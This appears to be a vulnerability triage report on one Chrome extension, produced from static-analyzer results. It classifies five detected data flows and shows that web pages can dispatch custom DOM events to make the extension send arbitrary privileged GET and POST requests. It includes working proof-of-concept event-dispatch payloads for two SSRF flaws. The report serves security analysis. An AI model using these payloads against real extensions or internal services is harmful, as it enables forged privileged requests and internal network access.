# CoCo Analysis: aiacepmnmgokkgjaplbbloiccdmmfcaa

## Summary

- **Overall Assessment:** TRUE POSITIVE (3 TRUE POSITIVE, 2 FALSE POSITIVE)
- **Total Sinks Detected:** 5

---

## Sink 1: document_eventListener_RequestWindow → XMLHttpRequest_url_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/aiacepmnmgokkgjaplbbloiccdmmfcaa/opgen_generated_files/cs_0.js
Line 564    document.addEventListener('RequestWindow', function (evt) {
Line 565    var pid = evt.detail.pid;
Line 566    var urlPost = window.location.protocol + '//spineditor.com/Code/Web/WebService.asmx/PostForum?pid=' + pid;
```

**Code:**
```javascript
// Content script (cs_0.js, lines 564-574)
document.addEventListener('RequestWindow', function (evt) {
    var pid = evt.detail.pid;  // ← attacker-controlled
    var urlPost = window.location.protocol + '//spineditor.com/Code/Web/WebService.asmx/PostForum?pid=' + pid;
    RequestLinkUrl(urlPost, function (data) { // ← XMLHttpRequest
        var data = JSON.parse($(data).contents().text()).Content;
        data = JSON.parse(data);
        chrome.runtime.sendMessage({ type: "OpenForum", obj: data });
    }, function (data) {});
});
```

**Classification:** FALSE POSITIVE

**Reason:** The URL is hardcoded to `spineditor.com` (trusted backend). The attacker-controlled `pid` parameter only goes into the query string of a request to the developer's own infrastructure.

---

## Sink 2 & 3: document_eventListener_RequestLink → XMLHttpRequest_url_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/aiacepmnmgokkgjaplbbloiccdmmfcaa/opgen_generated_files/cs_0.js
Line 888    document.addEventListener('RequestLink', function (evt) {
Line 889    if (evt.detail != null) {
Line 899    url = requestLinkTemp.url;
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/aiacepmnmgokkgjaplbbloiccdmmfcaa/opgen_generated_files/bg.js
Line 990    x.open('GET', linkUrl);
```

**Code:**
```javascript
// Content script (cs_0.js, lines 888-901)
document.addEventListener('RequestLink', function (evt) {  // ← Attacker can dispatch event
    if (evt.detail != null) {
        requestLinkTemp = evt.detail;  // ← attacker-controlled
        RequestLinkFun()
    }
});

function RequestLinkFun() {
    var url = "";
    url = requestLinkTemp.url;  // ← attacker-controlled URL
    chrome.runtime.sendMessage({ type: "RequestLink", obj: url, captcha: captcha, ... }, ...);
}

// Background script (bg.js, lines 965-991)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.type == "RequestLink") {
        var linkUrl = request.obj;  // ← attacker-controlled URL
        spinUrlRequest = linkUrl;
        var x = new XMLHttpRequest();
        x.open('GET', linkUrl);  // ← SSRF sink
        x.responseType = 'text/plain';
        x.onload = function () {
            var data = x.response;
            if (x.status == 200) {
                spinUrlRequestData = data;
            } else {
                // ... handles errors
            }
        };
        x.send();
    }
});
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Any website (content script runs on `http://*/*` and `https://*/*`)

**Attack Vector:** DOM custom event

**Attack:**
```javascript
// On any webpage, attacker can dispatch custom event to trigger SSRF
var evt = document.createEvent('CustomEvent');
evt.initCustomEvent('RequestLink', true, false, {
    url: 'http://internal.server/admin',  // ← Attacker-controlled URL
    captcha: false,
    mid: '123',
    mobile: null
});
document.dispatchEvent(evt);
```

**Impact:** Privileged cross-origin request to arbitrary attacker-controlled URL. Extension makes GET request with elevated privileges, bypassing CORS restrictions. Attacker can access internal networks, probe services, or exfiltrate data.

---

## Sink 4 & 5: document_eventListener_AjaxLink → XMLHttpRequest_url_sink and XMLHttpRequest_post_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/aiacepmnmgokkgjaplbbloiccdmmfcaa/opgen_generated_files/cs_0.js
Line 950    document.addEventListener('AjaxLink', function (evt) {
Line 952    chrome.runtime.sendMessage({ type: "PostRequest", obj: evt.detail }, ...);
$FilePath$/Users/jianjia/Documents/COCO_results/all/10k/aiacepmnmgokkgjaplbbloiccdmmfcaa/opgen_generated_files/bg.js
Line 1038    var linkUrl = request.obj.url;
Line 1039    var datajson = request.obj.data;
Line 1052    x.open('POST', linkUrl);
Line 1067    x.send(datajson);
```

**Code:**
```javascript
// Content script (cs_0.js, lines 950-973)
document.addEventListener('AjaxLink', function (evt) {  // ← Attacker can dispatch
    var timeReq = setInterval(function () {
        chrome.runtime.sendMessage({ type: "PostRequest", obj: evt.detail }, ...);  // ← attacker-controlled
    }, 500);
});

// Background script (bg.js, lines 1037-1071)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.type == "PostRequest") {
        var linkUrl = request.obj.url;  // ← attacker-controlled
        var datajson = request.obj.data;  // ← attacker-controlled
        postRequest = linkUrl;
        var x = new XMLHttpRequest();
        x.open('POST', linkUrl);  // ← SSRF sink
        x.setRequestHeader("Content-type", "application/json");
        x.responseType = 'application/json';
        x.onload = function () {
            var data = x.response;
            if (x.status == 200) {
                postRequestData = data;
            } else {
                postRequestData = data;
            }
        };
        x.send(datajson);  // ← POST data sink
    }
});
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Any website (content script runs on `http://*/*` and `https://*/*`)

**Attack Vector:** DOM custom event

**Attack:**
```javascript
// On any webpage, attacker can dispatch custom event to trigger SSRF with POST
var evt = document.createEvent('CustomEvent');
evt.initCustomEvent('AjaxLink', true, false, {
    url: 'http://internal.server/admin/delete',  // ← Attacker-controlled URL
    data: JSON.stringify({action: 'delete', id: '123'})  // ← Attacker-controlled POST body
});
document.dispatchEvent(evt);
```

**Impact:** Privileged cross-origin POST request to arbitrary attacker-controlled URL with arbitrary POST data. Extension performs privileged HTTP requests with bypassed CORS, allowing attacks on internal services, state-changing operations, or data exfiltration.
